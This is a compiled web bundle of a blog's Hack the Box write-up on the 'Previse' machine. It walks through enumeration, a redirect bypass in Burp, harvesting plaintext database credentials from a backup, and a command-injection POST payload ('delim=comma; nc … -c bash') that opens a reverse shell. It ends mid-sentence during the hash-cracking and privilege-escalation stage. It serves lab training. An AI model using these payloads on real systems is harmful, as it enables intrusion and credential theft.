"use strict";(self.webpackChunkblog=self.webpackChunkblog||[]).push([[105],{3905:function(e,n,t){t.d(n,{Zo:function(){return c},kt:function(){return d}});var a=t(7294);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function r(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function o(e,n){if(null==e)return{};var t,a,i=function(e,n){if(null==e)return{};var t,a,i={},s=Object.keys(e);for(a=0;a<s.length;a++)t=s[a],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(a=0;a<s.length;a++)t=s[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var l=a.createContext({}),p=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):r(r({},n),e)),t},c=function(e){var n=p(e.components);return a.createElement(l.Provider,{value:n},e.children)},h={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},u=a.forwardRef((function(e,n){var t=e.components,i=e.mdxType,s=e.originalType,l=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),u=p(t),d=i,m=u["".concat(l,".").concat(d)]||u[d]||h[d]||s;return t?a.createElement(m,r(r({ref:n},c),{},{components:t})):a.createElement(m,r({ref:n},c))}));function d(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var s=t.length,r=new Array(s);r[0]=u;var o={};for(var l in n)hasOwnProperty.call(n,l)&&(o[l]=n[l]);o.originalType=e,o.mdxType="string"==typeof e?e:i,r[1]=o;for(var p=2;p<s;p++)r[p]=t[p];return a.createElement.apply(null,r)}return a.createElement.apply(null,t)}u.displayName="MDXCreateElement"},4634:function(e,n,t){t.r(n),t.d(n,{frontMatter:function(){return o},contentTitle:function(){return l},metadata:function(){return p},toc:function(){return c},default:function(){return u}});var a=t(7462),i=t(3366),s=(t(7294),t(3905)),r=["components"],o={sidebar_position:1},l="Previse",p={unversionedId:"Reports/hack-the-box/previse",id:"Reports/hack-the-box/previse",title:"Previse",description:"Hello, and thank you for expressing interest in my report on Previse, a CTF hosted by Hack the Box. Previse was uploaded by HTB user m4lwhere 138 days prior to the publication of this report and is currently considered by the HTB community to be easy to intermediate in terms of difficulty.",source:"@site/docs/Reports/hack-the-box/previse.md",sourceDirName:"Reports/hack-the-box",slug:"/Reports/hack-the-box/previse",permalink:"/docs/Reports/hack-the-box/previse",tags:[],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1},sidebar:"tutorialSidebar",previous:{title:"Welcome!",permalink:"/docs/welcome"},next:{title:"Introduction",permalink:"/docs/website-hosting/introduction"}},c=[{value:"Enumeration",id:"enumeration",children:[{value:"Nmap",id:"nmap",children:[],level:3},{value:"Gobuster",id:"gobuster",children:[],level:3}],level:2},{value:"MITM Attack \u2014 Burp Suite",id:"mitm-attack--burp-suite",children:[{value:"Viewing Protected Pages",id:"viewing-protected-pages",children:[],level:3},{value:"Generating a Privileged User",id:"generating-a-privileged-user",children:[],level:3}],level:2},{value:"Building Familiarity with Previse",id:"building-familiarity-with-previse",children:[{value:"Exploring the Previse Site",id:"exploring-the-previse-site",children:[],level:3},{value:"Examining the Previse Backup",id:"examining-the-previse-backup",children:[],level:3}],level:2},{value:"Gaining Shell Access",id:"gaining-shell-access",children:[{value:"Writing a Malicious POST Request",id:"writing-a-malicious-post-request",children:[],level:3},{value:"Connecting with Netcat",id:"connecting-with-netcat",children:[],level:3}],level:2},{value:"Searching for USER, SYSTEM Flags",id:"searching-for-user-system-flags",children:[{value:"Connecting to the SQL Database",id:"connecting-to-the-sql-database",children:[],level:3},{value:"Finding and Cracking Password Hashes from the SQL Database",id:"finding-and-cracking-password-hashes-from-the-sql-database",children:[],level:3},{value:"Obtaining the USER Flag",id:"obtaining-the-user-flag",children:[],level:3},{value:"Escalating Privileges",id:"escalating-privileges",children:[],level:3},{value:"Obtaining the SYSTEM Flag",id:"obtaining-the-system-flag",children:[],level:3}],level:2},{value:"Conclusion",id:"conclusion",children:[],level:2}],h={toc:c};function u(e){var n=e.components,o=(0,i.Z)(e,r);return(0,s.kt)("wrapper",(0,a.Z)({},h,o,{components:n,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"previse"},"Previse"),(0,s.kt)("p",null,"Hello, and thank you for expressing interest in my report on ",(0,s.kt)("a",{parentName:"p",href:"https://app.hackthebox.com/machines/Previse"},"Previse"),", a CTF hosted by Hack the Box. Previse was uploaded by HTB user ",(0,s.kt)("a",{parentName:"p",href:"https://app.hackthebox.com/users/107145"},"m4lwhere")," 138 days prior to the publication of this report and is currently considered by the HTB community to be easy to intermediate in terms of difficulty."),(0,s.kt)("p",null,"Previse requires the submission of a USER flag and a SYSTEM flag, and I have described the process I used to capture both in-depth below."),(0,s.kt)("p",null,(0,s.kt)("em",{parentName:"p"},"Feedback? ",(0,s.kt)("a",{parentName:"em",href:"mailto:contact@swlacy.com?subject=Suggestion%20Regarding%20Previse%20Report"},"I can be reached via email"),".")),(0,s.kt)("h2",{id:"enumeration"},"Enumeration"),(0,s.kt)("h3",{id:"nmap"},"Nmap"),(0,s.kt)("p",null,"This is a single-machine CTF, for which HTB has already provided the IP address (",(0,s.kt)("strong",{parentName:"p"},"10.10.11.104"),"), so we can begin with an NMAP scan on the target \u2014 taking some inspiration from ",(0,s.kt)("a",{parentName:"p",href:"https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA"},"IppSec"),", executing ",(0,s.kt)("a",{parentName:"p",href:"https://explainshell.com/explain?cmd=nmap+-sC+-sV+-oA+previse+10.10.11.104"},(0,s.kt)("inlineCode",{parentName:"a"},"nmap -sC -sV -oA previse 10.10.11.104"))," will hopefully reveal some information of interest."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"\u250c[slak]\u2500[tun0:10.10.14.70]\u2500[/home/slak/reports/previse]\n\u2514>> nmap -sC -sV -oA previse 10.10.11.104\n\nStarting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 10.10.11.104\nHost is up (0.083s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n| 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)\n| 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)\n|_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)\n80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\n| http-title: Previse Login\n|_Requested resource was login.php\n| http-cookie-flags: \n| /: \n| PHPSESSID: \n|_ httponly flag not set\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.67 seconds\n")),(0,s.kt)("p",null,"As it appears, Previse is listening on port 22 for incoming SSH connections and on port 80 for HTTP requests with an Apache server. Navigating to ",(0,s.kt)("a",{parentName:"p",href:"http://10.10.11.104"},"http://10.10.11.104")," redirects to ",(0,s.kt)("a",{parentName:"p",href:"http://10.10.11.104/login.php"},"http://10.10.11.104/login.php"),"; here's a screenshot of that page: ",(0,s.kt)("img",{alt:"Screenshot of http://10.10.11.104/login.php",src:t(5504).Z})),(0,s.kt)("p",null,"Good news \u2014 a login portal is likely something we can exploit. I tried a few common credential combinations, such as ",(0,s.kt)("inlineCode",{parentName:"p"},"admin:admin")," and ",(0,s.kt)("inlineCode",{parentName:"p"},"user:password"),", but was unable to log in. No matter, however, as the site still may hold useful resources not protected by a credential prompt. To determine whether this is the case, let's use Gobuster."),(0,s.kt)("h3",{id:"gobuster"},"Gobuster"),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php")," performs a brute force directory search on Previse to reveal any hidden pages with names found in ",(0,s.kt)("em",{parentName:"p"},"directory-list-2.3-medium.txt")," and which have file extensions of .html, .txt, or .php. Executing that command took quite some time, and I unfortunately ran into rate-limiting issues \u2014 after all, the word list used contains 220560 elements. Eventually, however, Gobuster yielded the following:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'\u250c[slak]\u2500[tun0:10.10.14.70]\u2500[/home/slak/reports/previse]\n\u2514>> gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url: http://10.10.11.104\n[+] Method: GET\n[+] Threads: 10\n[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n[+] Negative Status codes: 404\n[+] User Agent: gobuster/3.1.0\n[+] Extensions: html,txt,php\n[+] Timeout: 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.php (Status: 302) [Size: 2801] [--\x3e login.php]\n/download.php (Status: 302) [Size: 0] [--\x3e login.php]\n/login.php (Status: 200) [Size: 2224]\n/files.php (Status: 302) [Size: 4914] [--\x3e login.php]\n/header.php (Status: 200) [Size: 980]\n/nav.php (Status: 200) [Size: 1248]\n/footer.php (Status: 200) [Size: 217] \n/css (Status: 301) [Size: 310] [--\x3e http://10.10.11.104/css/]\n/status.php (Status: 302) [Size: 2968] [--\x3e login.php]\n/js (Status: 301) [Size: 309] [--\x3e http://10.10.11.104/js/]\n/logout.php (Status: 302) [Size: 0] [--\x3e login.php]\n/accounts.php (Status: 302) [Size: 3994] [--\x3e login.php]\n/config.php (Status: 200) [Size: 0]\n/logs.php (Status: 302) [Size: 0] [--\x3e login.php]\nProgress: 182532 / 882244 (20.69%)\n\n[ERROR] [!] Get "http://10.10.11.104/17878": context deadline exceeded (Client.Timeout exceeded while awaiting headers)\n[ERROR] [!] Get "http://10.10.11.104/chatterbox.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)\n[ERROR] [!] Get "http://10.10.11.104/merchantsolutions.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)\n\n^C\n')),(0,s.kt)("p",null,"Unfortunately, the majority of pages found by Gobuster redirect back to login.php page, and the exceptions are not useful in ways I have knowledge of... For example, viewing a global CSS configuration file was permitted sans-login at /css/uikit.min.css. Clearly, this issue calls for a different strategy."),(0,s.kt)("h2",{id:"mitm-attack--burp-suite"},"MITM Attack \u2014 Burp Suite"),(0,s.kt)("h3",{id:"viewing-protected-pages"},"Viewing Protected Pages"),(0,s.kt)("p",null,"If attempting to view specific pages leads to redirection back to login.php, perhaps some information may be gleaned from examining the redirect process. Burp Suite's Proxy tool can be used to intercept and modify HTTP requests and responses \u2014 a man-in-the-middle (MITM) attack. Browsing to the accounts.php page is one such URL redirected to login.php, as shown by Gobuster: ",(0,s.kt)("inlineCode",{parentName:"p"},"/accounts.php (Status: 302) [Size: 3994] [--\x3e login.php]"),". See below: upon capturing the HTTP traffic of navigation to accounts.php in Burp Suite, we can see that the response for the request ",(0,s.kt)("inlineCode",{parentName:"p"},"GET /accounts.php HTTP/1.1")," is ",(0,s.kt)("inlineCode",{parentName:"p"},"HTTP/1.1 302 Found"),", and not only that, the source of accounts.php has been captured as well. ",(0,s.kt)("img",{alt:"Screenshot of accounts.php intercept in Burp Suite",src:t(348).Z})),(0,s.kt)("p",null,'Seeing the "ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!" banner is a sure sign of progress. The captured source code, rendered above:'),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-html"},'HTTP/1.1 302 Found\nDate: Thu, 23 Dec 2021 10:43:36 GMT\nServer: Apache/2.4.29 (Ubuntu)\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\nLocation: login.php\nContent-Length: 3994\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n\n<!DOCTYPE html>\n<html>\n    <head>\n        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />\n        <meta charset="utf-8" />\n    \n            \n        <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n        <meta name="description" content="Previse rocks your socks." />\n        <meta name="author" content="m4lwhere" />\n        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />\n        <link rel="icon" href="/favicon.ico" type="image/x-icon" />\n        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">\n        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">\n        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">\n        <link rel="manifest" href="/site.webmanifest">\n        <link rel="stylesheet" href="css/uikit.min.css" />\n        <script src="js/uikit.min.js"><\/script>\n        <script src="js/uikit-icons.min.js"><\/script>\n   \n<title>Previse Create Account</title>\n</head>\n<body>\n    \n<nav class="uk-navbar-container" uk-navbar>\n    <div class="uk-navbar-center">\n        <ul class="uk-navbar-nav">\n            <li class="uk-active"><a href="/index.php">Home</a></li>\n            <li>\n                <a href="accounts.php">ACCOUNTS</a>\n                <div class="uk-navbar-dropdown">\n                    <ul class="uk-nav uk-navbar-dropdown-nav">\n                        <li><a href="accounts.php">CREATE ACCOUNT</a></li>\n                    </ul>\n                </div>\n            </li>\n            <li><a href="files.php">FILES</a></li>\n            <li>\n                <a href="status.php">MANAGEMENT MENU</a>\n                <div class="uk-navbar-dropdown">\n                    <ul class="uk-nav uk-navbar-dropdown-nav">\n                        <li><a href="status.php">WEBSITE STATUS</a></li>\n                        <li><a href="file_logs.php">LOG DATA</a></li>\n                    </ul>\n                </div>\n            </li>\n            <li><a href="#" class=".uk-text-uppercase"></span></a></li>\n            <li>\n                <a href="logout.php">\n                    <button class="uk-button uk-button-default uk-button-small">LOG OUT</button>\n                </a>\n            </li>\n        </ul>\n    </div>\n</nav>\n\n<section class="uk-section uk-section-default">\n    <div class="uk-container">\n        <h2 class="uk-heading-divider">Add New Account</h2>\n        <p>Create new user.</p>\n        <p class="uk-alert-danger">ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!</p>\n        <p>Usernames and passwords must be between 5 and 32 characters!</p>\n    </p>\n        <form role="form" method="post" action="accounts.php">\n            <div class="uk-margin">\n                <div class="uk-inline">\n                    <span class="uk-form-icon" uk-icon="icon: user"></span>\n                    <input type="text" name="username" class="uk-input" id="username" placeholder="Username">\n                </div>\n            </div>\n            <div class="uk-margin">\n                <div class="uk-inline">\n                    <span class="uk-form-icon" uk-icon="icon: lock"></span>\n                    <input type="password" name="password" class="uk-input" id="password" placeholder="Password">\n                </div>\n            </div>\n            <div class="uk-margin">\n                <div class="uk-inline">\n                    <span class="uk-form-icon" uk-icon="icon: lock"></span>\n                    <input type="password" name="confirm" class="uk-input" id="confirm" placeholder="Confirm Password">\n                </div>\n            </div>\n            <button type="submit" name="submit" class="uk-button uk-button-default">CREATE USER</button>\n        </form>\n    </div>\n</section>\n            \n<div class="uk-position-bottom-center uk-padding-small">\n    <a href="https://m4lwhere.org/" target="_blank"><button class="uk-button uk-button-text uk-text-small">Created by m4lwhere</button></a>\n</div>\n</body>\n</html>\n')),(0,s.kt)("p",null,"The HTML above contains some interesting and relevant information:"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},'"Usernames and passwords must be between 5 and 32 characters"'),(0,s.kt)("li",{parentName:"ul"},"The user addition form requires a POST request to accounts.php with the following fields:",(0,s.kt)("ul",{parentName:"li"},(0,s.kt)("li",{parentName:"ul"},"A username"),(0,s.kt)("li",{parentName:"ul"},"A password"),(0,s.kt)("li",{parentName:"ul"},"A password confirmation"),(0,s.kt)("li",{parentName:"ul"},"A click event on the CREATE USER button")))),(0,s.kt)("h3",{id:"generating-a-privileged-user"},"Generating a Privileged User"),(0,s.kt)("p",null,"Given that criteria, consider the credential set ",(0,s.kt)("inlineCode",{parentName:"p"},"username123:password123"),". We can enter that information into the actual accounts.php page by injecting a false HTTP response code of 200 (OK) ",(0,s.kt)("a",{parentName:"p",href:"https://onappsec.com/how-to-edit-response-in-burp-proxy/"},"using Burp Suite Proxy"),": ",(0,s.kt)("img",{alt:"Screenshot of accessing accounts.php via response code inject",src:t(2045).Z})),(0,s.kt)("p",null,"Navigating to the login portal and submitting ",(0,s.kt)("inlineCode",{parentName:"p"},"username123:password123")," now permits access to any previously restricted credential-pages, as can be seen below, given the example of files.php: ",(0,s.kt)("img",{alt:"Screenshot of accessing accounts.php via response code inject",src:t(9803).Z})),(0,s.kt)("h2",{id:"building-familiarity-with-previse"},"Building Familiarity with Previse"),(0,s.kt)("h3",{id:"exploring-the-previse-site"},"Exploring the Previse Site"),(0,s.kt)("p",null,"A plethora of interesting material now lies within our grasp \u2014 for instance, a full site backup may be downloaded via a link at files.php. Or, perhaps nearly as significant, a log of user activity as related to file downloads may be downloaded at file_logs.php, which looks like so:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"\u250c[slak]\u2500[tun0:10.10.14.70]\u2500[/home/slak/reports/previse]\n\u2514>> cat previse.log\ntime,user,fileID\n1622482496,m4lwhere,4\n1622485614,m4lwhere,4\n1622486215,m4lwhere,4\n1622486218,m4lwhere,1\n1622486221,m4lwhere,1\n1622678056,m4lwhere,5\n1622678059,m4lwhere,6\n1622679247,m4lwhere,1\n1622680894,m4lwhere,5\n1622708567,m4lwhere,4\n1622708573,m4lwhere,4\n1622708579,m4lwhere,5\n1622710159,m4lwhere,4\n1622712633,m4lwhere,4\n1622715674,m4lwhere,24\n1622715842,m4lwhere,23\n1623197471,m4lwhere,25\n1623200269,m4lwhere,25\n1623236411,m4lwhere,23\n1623236571,m4lwhere,26\n1623238675,m4lwhere,23\n1623238684,m4lwhere,23\n1623978778,m4lwhere,32\n1640244467,username,32\n1640244685,username,32\n1640244690,username,1\n1640244699,username,12312421\n1640244721,username,4\n1640244726,username,5\n1640244735,username,6\n1640244741,username,24\n1640244751,username,23\n1640244755,username,25\n1640244760,username,26\n1640244769,username,32\n1640244776,username,33\n1640244793,username,24\n1640246372,recon_pilot,32\n1640247712,recon_pilot,33\n1640249049,recon_pilot,32\n1640260386,username123,32\n")),(0,s.kt)("p",null,"As a reminder, user ",(0,s.kt)("inlineCode",{parentName:"p"},"m4lwhere")," is the user who created this CTF; I assume all other users are currently active CTF participants. At the bottom, our injected username (",(0,s.kt)("inlineCode",{parentName:"p"},"username123"),") can be seen. The link to download the site backup is http:/10.10.11.104/download.php?file=32. The log shows various users attempting to download many other files, so I did the same \u2014 sadly, as far as I can tell, only file ",(0,s.kt)("inlineCode",{parentName:"p"},"32")," exists."),(0,s.kt)("h3",{id:"examining-the-previse-backup"},"Examining the Previse Backup"),(0,s.kt)("p",null,"Returning to the website backup, it seems that the following files are included, consistent with the pages previously found by Gobuster:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"\u250c[slak]\u2500[tun0:10.10.14.70]\u2500[/home/slak/reports/previse/siteBackup]\n\u2514>> ls\ntotal 60K\n-rw-r--r-- 1 slak slak 5.6K Jun 12  2021 accounts.php\n-rw-r--r-- 1 slak slak  208 Jun 12  2021 config.php\n-rw-r--r-- 1 slak slak 1.6K Jun  9  2021 download.php\n-rw-r--r-- 1 slak slak 1.2K Jun 12  2021 file_logs.php\n-rw-r--r-- 1 slak slak 6.0K Jun  9  2021 files.php\n-rw-r--r-- 1 slak slak  217 Jun  3  2021 footer.php\n-rw-r--r-- 1 slak slak 1012 Jun  5  2021 header.php\n-rw-r--r-- 1 slak slak  551 Jun  5  2021 index.php\n-rw-r--r-- 1 slak slak 2.9K Jun 12  2021 login.php\n-rw-r--r-- 1 slak slak  190 Jun  8  2021 logout.php\n-rw-r--r-- 1 slak slak 1.2K Jun  9  2021 logs.php\n-rw-r--r-- 1 slak slak 1.3K Jun  5  2021 nav.php\n-rw-r--r-- 1 slak slak 1.9K Jun  9  2021 status.php\n")),(0,s.kt)("p",null,"The file config.php contains just the information I'd hoped for: plaintext credentials."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-php"},"\u250c[slak]\u2500[tun0:10.10.14.70]\u2500[/home/slak/reports/previse/siteBackup]\n\u2514>> cat config.php\n<?php\n\nfunction connectDB(){\n    $host = 'localhost';\n    $user = 'root';\n    $passwd = 'mySQL_p@ssw0rd!:)';\n    $db = 'previse';\n    $mycon = new mysqli($host, $user, $passwd, $db);\n    return $mycon;\n}\n\n?>\n")),(0,s.kt)("p",null,"It appears that an SQL database is connected to using credential pair ",(0,s.kt)("inlineCode",{parentName:"p"},"root:mySQL_p@ssw0rd!:)"),". This may be our way in, should the database be vulnerable to code injection. The next step, then, requires setting aside my prejudice against PHP, as the other files must be searched for input handling issues. And Indeed, after spending an inordinate amount of time searching for issues within the PHP source of the site, logs.php contains a potentially exploitable PHP ",(0,s.kt)("inlineCode",{parentName:"p"},"exec()")," function... Did I mention my distaste for PHP? Anyway, consider the exec function in question:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-php"},"$output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\");\n")),(0,s.kt)("p",null,"If we craft a POST request such that the delimiter (",(0,s.kt)("inlineCode",{parentName:"p"},"delim"),") has an executable statement appended to it, that statement should be executed. For that reason, ",(0,s.kt)("inlineCode",{parentName:"p"},"exec")," is a dangerous PHP function, especially given the lack of input validation present here. Always sanitize input!"),(0,s.kt)("h2",{id:"gaining-shell-access"},"Gaining Shell Access"),(0,s.kt)("h3",{id:"writing-a-malicious-post-request"},"Writing a Malicious POST Request"),(0,s.kt)("p",null,"As previously mentioned, if we create a normal post request to file_logs.php as follows, we then only need to append a malicious custom ",(0,s.kt)("inlineCode",{parentName:"p"},"delim")," parameter to the end \u2014 one step at a time though.\nConsider the following request, captured when submitting a request for log data from file_logs.php: ",(0,s.kt)("img",{alt:"Screenshot of obtaining a valid POST request to file_logs.php",src:t(7924).Z})),(0,s.kt)("p",null,"At the bottom, ",(0,s.kt)("inlineCode",{parentName:"p"},"delim=comma")," can be seen; this can be changed to ",(0,s.kt)("inlineCode",{parentName:"p"},"delim=comma; <statement>")," to execute ",(0,s.kt)("inlineCode",{parentName:"p"},"<statement>")," when the POST request is forwarded. Ideally, a reverse shell may be set up to grant shell access. This, of course, can be difficult to do without knowing what packages are installed on the target."),(0,s.kt)("p",null,"I have only ever used Netcat with Metasploit modules on old Windows XP machines to create reverse shell access, so hopefully Previse has Netcat installed. A reverse shell using Netcat can be spawned with ",(0,s.kt)("a",{parentName:"p",href:"https://explainshell.com/explain?cmd=nc+10.10.14.70+1234+-e+-c+bash"},(0,s.kt)("inlineCode",{parentName:"a"},"nc 10.10.14.70 1234 -c bash")),"; so, the full post request can be as follows, given that my IP address is 10.10.14.70:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"POST /logs.php HTTP/1.1\nHost: 10.10.11.104\nContent-Length: 53\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://10.10.11.104\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://10.10.11.104/file_logs.php\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: PHPSESSID=b1hcqu7ulch7gleqm9f5jnapvm\nConnection: close\n\ndelim=comma; nc 10.10.14.70 1234 -c bash\n")),(0,s.kt)("h3",{id:"connecting-with-netcat"},"Connecting with Netcat"),(0,s.kt)("p",null,"Before sending the POST request with the malicious connection request, we must listen for incoming connections on port 1234, as specified, which is done with ",(0,s.kt)("a",{parentName:"p",href:"https://explainshell.com/explain?cmd=nc+-nlp+1234"},(0,s.kt)("inlineCode",{parentName:"a"},"nc -nlp 1234")),". After doing so, the post request may be sent... Looks like Previse has Netcat installed after all \u2014 basic shell access has been achieved!"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"\u250c[slak]\u2500[tun0:10.10.14.70]\u2500[/home/slak/reports/previse/siteBackup]\n\u2514>> nc -nlp 1234\nlistening on [any] 1234 ...\nconnect to [10.10.14.70] from (UNKNOWN) [10.10.11.104] 48236\n")),(0,s.kt)("p",null,"Executing ",(0,s.kt)("inlineCode",{parentName:"p"},"whoami")," yields ",(0,s.kt)("inlineCode",{parentName:"p"},"www-data"),", as expected."),(0,s.kt)("h2",{id:"searching-for-user-system-flags"},"Searching for USER, SYSTEM Flags"),(0,s.kt)("h3",{id:"connecting-to-the-sql-database"},"Connecting to the SQL Database"),(0,s.kt)("p",null,"The primary incentive behind gaining shell access was to connect to the SQL database using the ",(0,s.kt)("inlineCode",{parentName:"p"},"root:mySQL_p@ssw0rd!:)")," credential set found in the site backup under config.php. Let's see if those credentials work as expected:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-sql"},"mysql -u root -p\nEnter password: mySQL_p@ssw0rd!:)\n\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 1434\nServer version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)\n\nCopyright (c) 2000, 2021, Oracle and/or its affiliates.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql> show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| previse            |\n| sys                |\n+--------------------+\n5 rows in set (0.01 sec)\n\nmysql> use previse;\nuse previse;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql> show tables;\nshow tables;\n+-------------------+\n| Tables_in_previse |\n+-------------------+\n| accounts          |\n| files             |\n+-------------------+\n2 rows in set (0.01 sec)\n\nmysql> \n")),(0,s.kt)("h3",{id:"finding-and-cracking-password-hashes-from-the-sql-database"},"Finding and Cracking Password Hashes from the SQL Database"),(0,s.kt)("p",null,"It seems the credentials do work! That ",(0,s.kt)("inlineCode",{parentName:"p"},"accounts")," table looks pretty interesting. Contents:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-sql"},"mysql> select * from accounts;\nselect * from accounts;\n+----+---------------+------------------------------------+---------------------+\n| id | username      | password                           | created_at          |\n+----+---------------+------------------------------------+---------------------+\n|  1 | m4lwhere      | <REDACTED>                         | 2021-05-27 18:18:36 |\n|  2 | Squid         | <REDACTED>                         | 2021-12-23 05:14:33 |\n|  3 | username      | <REDACTED>                         | 2021-12-23 07:08:53 |\n|  4 | recon_pilot   | <REDACTED>                         | 2021-12-23 07:58:57 |\n|  5 | administrator | <REDACTED>                         | 2021-12-23 08:14:22 |\n|  6 | username123   | <REDACTED>                         | 2021-12-23 11:38:07 |\n|  7 | nada123       | <REDACTED>                         | 2021-12-23 13:11:39 |\n+----+---------------+------------------------------------+---------------------+\n7 rows in set (0.00 sec)\n")),(0,s.kt)("p",null,"Very nice! We have all existing usernames and their password hashes for each user of the Previse site \u2014 of course, only the ",(0,s.kt)("inlineCode",{parentName:"p"},"m4lwhere")," user is of any interest, as all other usernames are HTB users. ",(0,s.kt)("em",{parentName:"p"},"Note that, to preserve the integrity of the CTF, the password hashes have been redacted.")," John or Hashcat could be used here \u2014 I'll use John, since I'm familiar with it and the GPU in my Parrot machine is far from powerful..."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"\u250c[slak]\u2500[tun0:down]\u2500[/home/slak/reports/previse]\n\u2514>> john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long\nCreated directory: /home/slak/.john\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n\n...\n")),(0,s.kt)("p",null,"Lets explore the Previse file system while John is running. Exiting from the SQL database and executing ",(0,s.kt)("inlineCode",{parentName:"p"},"ls /home")," reveals the existence of the ",(0,s.kt)("inlineCode",{parentName:"p"},"m4lwhere")," user's home directory. Pushing further reveals..."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"www-data@previse:/var/www/html$ ls /home/m4lwhere\nuser.txt\nwww-data@previse:/var/www/html$ cat /home/m4lwhere/user.txt\ncat: /home/m4lwhere/user.txt: Permission denied\n")),(0,s.kt)("p",null,"The USER flag! Too bad it's read-protected. No matter; remember the open port 22 from the enumeration stage? We'll (hopefully) be able to SSH into Previse as ",(0,s.kt)("inlineCode",{parentName:"p"},"m4lwhere")," 